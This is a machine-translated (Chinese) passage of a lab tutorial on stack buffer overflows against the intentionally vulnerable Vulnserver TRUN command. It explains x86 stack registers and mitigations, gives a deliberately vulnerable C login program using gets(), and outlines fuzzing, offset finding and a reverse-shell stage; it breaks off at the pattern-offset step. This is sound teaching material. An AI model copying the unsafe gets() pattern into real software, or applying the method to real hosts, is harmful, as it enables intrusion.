<html>
<head>
<title>Stack Based Buffer Overflow Practical For Windows (Vulnserver)</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">基于堆栈的缓冲区溢出实用程序(Vulnserver)</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/stack-based-buffer-overflow-practical-for-windows-vulnserver-8d2be7321af5?source=collection_archive---------1-----------------------#2021-04-13">https://infosecwriteups.com/stack-based-buffer-overflow-practical-for-windows-vulnserver-8d2be7321af5?source=collection_archive---------1-----------------------#2021-04-13</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="182d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">shams her Khan利用TRUN命令攻击vulnserver缓冲区溢出</strong></p><p id="0f72" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">缓冲区是在数据从一个位置传输到另一个位置时临时保存数据的内存存储区域。当数据量超过内存缓冲区的存储容量时，就会发生缓冲区溢出。因此，试图将数据写入缓冲区的程序会覆盖相邻的内存位置。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi kl"><img src="../Images/3f3237fd79b185955af93a6706741f27.png" data-original-src="https://miro.medium.com/v2/resize:fit:1152/format:webp/0*iJnFeGMo--DR6t5Q.jpeg"/></div></figure><p id="2861" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">图片来源:【https://www.hackingtutorials.org T2】</p><p id="2254" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这是一个严重的漏洞，让别人访问您的重要内存位置。黑客可以插入他的恶意脚本并访问机器。这里有一张图片显示了一个堆栈的位置，这将是剥削的地方。堆就像一个自由浮动的内存区域。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi ku"><img src="../Images/539eedce9400ae6a78b9ebab972ed33d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1122/format:webp/1*bg-mGibHwDB_CfGUw-2KAg.png"/></div></figure><p id="abf8" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">图片来源:谷歌</p><p id="994a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在让我们试着理解堆栈层次结构。堆栈层次结构有扩展堆栈指针(ESP)、缓冲空间、扩展基址指针(EBP)和扩展指令指针(EIP)。</p><p id="eb53" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">ESP持有栈顶。它指向堆栈上最近推入的值。堆栈缓冲区是在计算机内存中创建的临时位置，用于从堆栈中存储和检索数据。EBP是当前堆栈帧的基指针。EIP是指令指针。它指向下一条要执行的指令的第一个字节(保存其地址)。</p><p id="8516" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">栈</strong></p><p id="76a1" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">堆栈:一种后进先出的数据结构，被计算机广泛用于内存管理等。</p><p id="3d95" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">内存中有一堆寄存器，但我们只关心EIP、EBP和ESP。</p><p id="799f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">EBP:这是一个堆栈指针，指向堆栈的底部。</p><p id="c4e2" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">ESP:是一个指向栈顶的栈指针。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi kv"><img src="../Images/3a6b0beabaa0393da5ebc70807e422fb.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ONGfOrcvEWT796IaZUVsTQ.png"/></div></figure><p id="e04e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">EIP:它包含下一条要执行的指令的地址</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kx ky di kz bf la"><div class="gh gi kw"><img src="../Images/4a269cd75fe46af68c1547772c43c222.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*4wQch3JTS8wJ54Kf_vvjmA.png"/></div></div></figure><p id="7f88" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">想象一下，如果我们将一串字符发送到缓冲区中。当它到达末尾时，它应该停止接受字符。但是如果这个角色开始改写EBP和EIP呢？这就是缓冲区溢出攻击发生的地方。如果我们能进入EIP，我们就可以插入恶意脚本来控制电脑。</p><p id="4768" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">让我们来看看与堆栈相关的一些要点:</strong></p><p id="7375" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">堆栈从较高的内存填充到较低的内存。<br/>在堆栈中，所有的变量都是相对于EBP来访问的。在一个程序中，每个函数都有自己的栈。<br/>所有内容均引用自EBP登记簿。</p><p id="ac20" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在32位架构中，内存堆栈有4个主要组件</p><p id="43f3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">扩展堆栈指针(<strong class="jp ir"> ESP </strong> ) <br/>缓冲空间<br/>扩展基址指针(<strong class="jp ir"> EBP </strong> ) <br/>扩展指令指针(<strong class="jp ir"> EIP </strong> ) /返回地址</p><h1 id="6451" class="lb lc iq bd ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly bi translated">定义:</h1><ol class=""><li id="6782" class="lz ma iq jp b jq mb ju mc jy md kc me kg mf kk mg mh mi mj bi translated">EIP = &gt; 扩展指令指针(EIP)是一个寄存器，包含程序或命令的下一条指令的地址。</li><li id="aa1f" class="lz ma iq jp b jq mk ju ml jy mm kc mn kg mo kk mg mh mi mj bi translated"><strong class="jp ir"> ESP= &gt;</strong></li><li id="7042" class="lz ma iq jp b jq mk ju ml jy mm kc mn kg mo kk mg mh mi mj bi translated"><strong class="jp ir"> JMP = &gt; </strong>跳转(JMP)是一条修改执行流程的指令，您指定的操作数将包含跳转到的地址。</li><li id="231c" class="lz ma iq jp b jq mk ju ml jy mm kc mn kg mo kk mg mh mi mj bi translated"><strong class="jp ir"> \x41，\x42，\ x43 =&gt;</strong>A、B、c的十六进制值，对于这个练习来说，使用十六进制vs ascii并没有什么好处，这只是我个人的喜好。</li></ol><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kx ky di kz bf la"><div class="gh gi mp"><img src="../Images/e1532710e32de956c70df720235c5aa7.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*7nuWfnkqb4iEHRygUc0hIA.png"/></div></div></figure><p id="3ae7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在，我们只关心“缓冲空间”和“EIP”。</p><p id="f7f1" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在编程语言中，缓冲空间被用作内存的存储区域。出于安全原因，放入缓冲空间的信息永远不应该传出缓冲空间</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kx ky di kz bf la"><div class="gh gi mp"><img src="../Images/754947a3593146c6b5fce981b6135633.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*gidKpzk7ASonMOjsubr_hA.jpeg"/></div></div></figure><p id="5f5e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在上图中，假设有许多A(0x 41)被发送到缓冲区空间，但已被正确清理。A没有移动到缓冲空间之外，因此没有发生缓冲区溢出。</p><p id="3a6b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在，看看缓冲区溢出-</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kx ky di kz bf la"><div class="gh gi mp"><img src="../Images/48225cc560d03546ee7b84b14cadf187.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*nOLQWT8zuTp1Bs0NXfKl8A.jpeg"/></div></div></figure><p id="106c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在上图中，发送到缓冲区空间的A(0x 41)的数量已经超出缓冲区空间，并且已经到达EIP。</p><p id="76f9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如果攻击者能够控制EIP，他或她就可以使用指针指向某些恶意代码并危及系统安全。我们将演示如何去做。</p><p id="250a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">缓冲区溢出攻击的类型</strong></p><p id="92cf" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">基于堆栈的缓冲区溢出更为常见，它利用只存在于函数执行期间的堆栈内存。</p><p id="2a15" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">基于堆的攻击更难实施，并且涉及淹没为程序分配的超出当前运行时操作使用的内存的内存空间。</p><p id="e80e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">哪些编程语言比较容易受到攻击？</strong></p><p id="965d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">C和C++是两种非常容易受到缓冲区溢出攻击的语言，因为它们没有内置的保护措施来防止覆盖或访问内存中的数据。Mac OSX、Windows和Linux都使用C和C++编写的代码。</p><p id="9fbb" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">PERL、Java、JavaScript和C#等语言使用内置的安全机制，将缓冲区溢出的可能性降至最低。</p><p id="131f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">如何防止缓冲区溢出</strong></p><p id="d99a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">开发人员可以通过代码中的安全措施或使用提供内置保护的语言来防止缓冲区溢出漏洞。</p><p id="0acc" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">此外，现代操作系统有运行时保护。三种常见的保护措施是:</p><p id="2968" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">地址空间随机化(ASLR) </strong> —随机移动数据区的地址空间位置。通常，缓冲区溢出攻击需要知道可执行代码的位置，随机化地址空间实际上不可能做到这一点。</p><p id="4677" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">数据执行保护</strong> —将某些内存区域标记为不可执行或可执行，这可以阻止攻击者在不可执行区域运行代码。</p><p id="ada1" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">结构化异常处理程序覆盖保护(SEHOP) </strong> —帮助阻止恶意代码攻击结构化异常处理(SEH)，这是一个用于管理硬件和软件异常的内置系统。因此，它防止攻击者能够利用SEH重写利用技术。在功能级别，使用基于堆栈的缓冲区溢出来覆盖存储在线程堆栈上的异常注册记录，从而实现SEH覆盖。</p><h1 id="be31" class="lb lc iq bd ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly bi translated">让我们举一个简单C程序如何处理缓冲区溢出的例子</h1><pre class="km kn ko kp gt mq mr ms mt aw mu bi"><span id="ce2d" class="mv lc iq mr b gy mw mx l my mz">#include&lt;stdio.h&gt;<br/>#include&lt;string.h&gt;</span><span id="9c84" class="mv lc iq mr b gy na mx l my mz">int main(void)<br/>{<br/>    char buff[15];<br/>    int pass = 0;</span><span id="8a3b" class="mv lc iq mr b gy na mx l my mz">printf("\n Enter the password : \n");<br/>    gets(buff);</span><span id="038e" class="mv lc iq mr b gy na mx l my mz">if(strcmp(buff, "mrsam"))<br/>    {<br/>        printf("\n Wrong Password \n");<br/>    }<br/>    else<br/>    {<br/>        printf("\n Correct Password \n");<br/>        pass = 1;<br/>    }</span><span id="7a11" class="mv lc iq mr b gy na mx l my mz">if(pass)<br/>    {<br/>       /* Now Give root or admin rights to user*/<br/>        printf("\n Root privileges given to the user \n");<br/>        char command[50];<br/>        strcpy( command, "ls -l" );<br/>        system(command);<br/>    }</span><span id="e641" class="mv lc iq mr b gy na mx l my mz">return 0;<br/>}</span></pre><p id="14f4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这是一个简单的登录系统程序，这个程序的正确密码是<strong class="jp ir"> mrsam </strong></p><p id="026a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">编译您的代码</p><pre class="km kn ko kp gt mq mr ms mt aw mu bi"><span id="3949" class="mv lc iq mr b gy mw mx l my mz">gcc program.c -o program</span></pre><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi ku"><img src="../Images/186a160c4a769670a2b9b9c807fa85a8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1122/format:webp/1*DOpyAPPGrfcQhviz6jYeJQ.png"/></div></figure><p id="1edf" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">正如你可以给正确的密码= <strong class="jp ir"> mrsam </strong>它将运行"<strong class="jp ir"> ls -l </strong>"</p><p id="403e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">命令</p><p id="6406" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在用错误的密码再次运行这个程序</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi nb"><img src="../Images/7c8f94eb90c6451e7d887caf842dfabe.png" data-original-src="https://miro.medium.com/v2/resize:fit:678/format:webp/1*gMq2rhinmZk3bimG7yLdRQ.png"/></div></figure><p id="416b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">当我输入错误的密码时，程序没有运行“<strong class="jp ir"> ls -l </strong>命令</p><p id="2229" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在再次运行这个程序，错误的密码多于字符</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi nc"><img src="../Images/1825211e3c02d9a2e4f45d90c3a368bc.png" data-original-src="https://miro.medium.com/v2/resize:fit:1226/format:webp/1*tRcNPAl_UxiDzfYsvbL2KA.png"/></div></figure><p id="1f48" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在上面的例子中，即使输入了一个错误的密码，程序也能按照你给出的正确密码运行。</p><p id="ba2f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">上面的输出背后有一个逻辑。攻击者所做的是，他/她提供了一个长度大于缓冲区所能容纳的长度的输入，在特定长度的输入时，缓冲区发生溢出，从而覆盖了整数“pass”的内存。因此，尽管密码错误，但“pass”的值变为非零，因此攻击者获得了超级用户权限。</p><h2 id="842a" class="mv lc iq bd ld nd ne dn lh nf ng dp ll jy nh ni lp kc nj nk lt kg nl nm lx nn bi translated">Vulnserver是什么？</h2><p id="0dc9" class="pw-post-body-paragraph jn jo iq jp b jq mb js jt ju mc jw jx jy no ka kb kc np ke kf kg nq ki kj kk ij bi translated">Vulnserver是为学习软件开发而创建的。它是一个基于Windows的多线程TCP服务器，侦听端口9999(默认)上的客户端连接，并允许用户运行许多不同的命令，这些命令容易受到各种类型的缓冲区溢出攻击。源代码可以在<a class="ae kt" href="https://github.com/stephenbradshaw/vulnserver" rel="noopener ugc nofollow" target="_blank">这里</a>找到。</p><div class="nr ns gp gr nt nu"><a href="https://github.com/stephenbradshaw/vulnserver" rel="noopener  ugc nofollow" target="_blank"><div class="nv ab fo"><div class="nw ab nx cl cj ny"><h2 class="bd ir gy z fp nz fr fs oa fu fw ip bi translated">stephenbradshaw/vulnserver</h2><div class="ob l"><h3 class="bd b gy z fp nz fr fs oa fu fw dk translated">查看我在http://thegreycorner.com/的博客，了解更多信息和该软件的更新。Vulnserver是一个…</h3></div><div class="oc l"><p class="bd b dl z fp nz fr fs oa fu fw dk translated">github.com</p></div></div><div class="od l"><div class="oe l of og oh od oi kr nu"/></div></div></a></div><div class="nr ns gp gr nt nu"><a href="https://www.immunityinc.com/products/debugger/" rel="noopener  ugc nofollow" target="_blank"><div class="nv ab fo"><div class="nw ab nx cl cj ny"><h2 class="bd ir gy z fp nz fr fs oa fu fw ip bi translated">抗干扰调试器</h2><div class="ob l"><h3 class="bd b gy z fp nz fr fs oa fu fw dk translated">下载此处下载免疫调试器！概述具有专门为安全设计的功能的调试器…</h3></div><div class="oc l"><p class="bd b dl z fp nz fr fs oa fu fw dk translated">www.immunityinc.com</p></div></div><div class="od l"><div class="oj l of og oh od oi kr nu"/></div></div></a></div><p id="359d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">使用的工具/操作系统:</strong></p><pre class="km kn ko kp gt mq mr ms mt aw mu bi"><span id="648f" class="mv lc iq mr b gy mw mx l my mz">Attacker Machine : Kali Linux Rolling<br/>Victim Host : Windows 7 ultimate 32 bit<br/>Vulnserver application (<a class="ae kt" href="https://github.com/stephenbradshaw/vulnserver" rel="noopener ugc nofollow" target="_blank">github</a>)<br/>Immunity Debugger v1.85</span></pre><p id="f7be" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">注意:- </strong></p><pre class="km kn ko kp gt mq mr ms mt aw mu bi"><span id="682f" class="mv lc iq mr b gy mw mx l my mz">Attacker’s IP : 192.168.43.73<br/>Victim’s IP : 192.168.43.112<br/>Vulnerable port : 9999 ( Vulnserver )<br/>Vulnerable parameter : TRUN</span></pre><p id="2664" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">简单步骤</strong></p><p id="d3cc" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">第一部分</p><ol class=""><li id="63e6" class="lz ma iq jp b jq jr ju jv jy ok kc ol kg om kk mg mh mi mj bi translated">模糊服务参数并获取崩溃字节</li><li id="72d9" class="lz ma iq jp b jq mk ju ml jy mm kc mn kg mo kk mg mh mi mj bi translated">生成模式</li><li id="a0fc" class="lz ma iq jp b jq mk ju ml jy mm kc mn kg mo kk mg mh mi mj bi translated">在(EIP)的帮助下找到字节崩溃的正确偏移量</li></ol><p id="fd17" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">第二部分</strong></p><ol class=""><li id="5f86" class="lz ma iq jp b jq jr ju jv jy ok kc ol kg om kk mg mh mi mj bi translated">用mona.py查找坏字符，并用mona.py比较坏字符串</li><li id="519f" class="lz ma iq jp b jq mk ju ml jy mm kc mn kg mo kk mg mh mi mj bi translated">使用mona.py查找回邮地址(JMP ESP)</li></ol><p id="78ae" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">第三部分</strong></p><ol class=""><li id="c1d1" class="lz ma iq jp b jq jr ju jv jy ok kc ol kg om kk mg mh mi mj bi translated">设置断点以验证返回地址是否正确</li><li id="d40a" class="lz ma iq jp b jq mk ju ml jy mm kc mn kg mo kk mg mh mi mj bi translated">在msfvenom的帮助下创建反向外壳</li><li id="4ab3" class="lz ma iq jp b jq mk ju ml jy mm kc mn kg mo kk mg mh mi mj bi translated">向脚本中添加NOP</li><li id="eec6" class="lz ma iq jp b jq mk ju ml jy mm kc mn kg mo kk mg mh mi mj bi translated">获取外壳</li></ol><p id="bc9e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">右键单击vulnserver默认情况下以管理员身份运行vulnserver在端口9999上运行</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kx ky di kz bf la"><div class="gh gi on"><img src="../Images/78ab00c70bf67d8439285eef0bef782d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*S1qghgsy6FTV53K1eMXSwQ.png"/></div></div></figure><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi oo"><img src="../Images/adac920a1b492694a9162ef0fb39192c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1224/format:webp/1*dQ3pFL5tHEo6rheVZVN4kQ.png"/></div></figure><p id="75b6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">因此，您可以看到上面的图片vulnserver正在端口9999上运行</p><h1 id="38cb" class="lb lc iq bd ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly bi translated">起毛</h1><p id="aad1" class="pw-post-body-paragraph jn jo iq jp b jq mb js jt ju mc jw jx jy no ka kb kc np ke kf kg nq ki kj kk ij bi translated">测试缓冲区溢出的第一步是模糊化。<br/> Fuzzing允许我们在不断增长的迭代中向易受攻击的程序(在我们的例子中是Vulnserver)发送字节的数据，以溢出缓冲区空间并覆盖EIP。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi op"><img src="../Images/20a7f0af9522c3d80435a1b26968ac5a.png" data-original-src="https://miro.medium.com/v2/resize:fit:920/format:webp/1*9ikeQHDuev3keurIwAopXQ.png"/></div></figure><p id="3022" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">从这里我们可以看到可用的命令。这是事情变得有趣的地方，我们将模糊一些命令来找出它崩溃的地方。我将使用TRUN命令，尽管任何命令都是可行的测试主题</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi oq"><img src="../Images/dd7e96962cada0e3fe0f4ec2dc68a19e.png" data-original-src="https://miro.medium.com/v2/resize:fit:770/format:webp/1*tg3P6IV7M-JA-n1_6BHXHQ.png"/></div></figure><p id="cd09" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">所以这是手动模糊化，要花很长时间才能使程序崩溃</p><p id="55da" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">所以这里我们将使用Python脚本</p><p id="0df2" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在，让我们在Linux机器<a class="ae kt" href="https://github.com/shamsherkhan852/Buffer-Overflow-tools" rel="noopener ugc nofollow" target="_blank"><strong class="jp ir">fuzzing . py</strong></a><strong class="jp ir"/>上编写一个简单的Python fuzzing脚本</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi or"><img src="../Images/0312c7af8d94ff2f21fb9ff897a36bbe.png" data-original-src="https://miro.medium.com/v2/resize:fit:1252/format:webp/1*PbZ3TFkx7nf-dSd3YMh1gw.png"/></div></figure><p id="4206" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">需要注意的是，s.connect()中的IP将属于运行Vulnserver的Windows机器，默认情况下它运行在端口9999上，我们攻击的漏洞是通过“TRUN”命令。</p><p id="587a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在，在免疫调试器中点击“文件”并选择vulnserver.exe。</p><p id="eff7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">单击播放按钮运行vulnserver.exe程序。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kx ky di kz bf la"><div class="gh gi os"><img src="../Images/ec5fd35f5322a14a02c7bbe41e338d05.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*WjrCDM-nqC6Nt-aliTzQmg.png"/></div></div></figure><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi ot"><img src="../Images/9ac8f3742d4a22861141c42f910760e6.png" data-original-src="https://miro.medium.com/v2/resize:fit:670/format:webp/1*-iUAyeGlZ7eWsB4YmAYTsQ.png"/></div></figure><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi ou"><img src="../Images/384f2999a550b0fae2b2dcbadb7caa84.png" data-original-src="https://miro.medium.com/v2/resize:fit:362/format:webp/1*SqAUgz3NifIyzppaZlTiiw.png"/></div></figure><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi ov"><img src="../Images/ce433ad3ffabdce1d1b164aee111d3a6.png" data-original-src="https://miro.medium.com/v2/resize:fit:868/format:webp/1*hq0q1jv7Dj7FP1lD20qX5A.png"/></div></figure><p id="0a46" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">等到程序崩溃，你会在免疫调试器的右下角看到“暂停”状态。</p><p id="a648" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在我的例子中，vulnserver在5900字节后崩溃。此外，并非所有寄存器都被“A”(0x 41)覆盖，除非程序崩溃，否则这不是问题。我们现在有了一个发送数据使程序崩溃的总体思路。见下图</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi ow"><img src="../Images/0fdaa970805aa2cd97ef9347c7567d06.png" data-original-src="https://miro.medium.com/v2/resize:fit:1328/format:webp/1*W9oInNcInZtHJQ3dImAXmQ.png"/></div></figure><p id="5a44" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们下一步需要做的是计算出EIP的确切位置(以字节为单位),并试图控制它。</p><h1 id="7641" class="lb lc iq bd ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly bi translated">寻找偏移</h1><p id="461f" class="pw-post-body-paragraph jn jo iq jp b jq mb js jt ju mc jw jx jy no ka kb kc np ke kf kg nq ki kj kk ij bi translated">现在我们知道了如何覆盖EIP，并且覆盖发生在1到5900字节之间。</p><p id="0be6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们使用两个Ruby工具:“模式创建”和“模式偏移”来找到覆盖的确切位置。</p><p id="1f6e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">Pattern 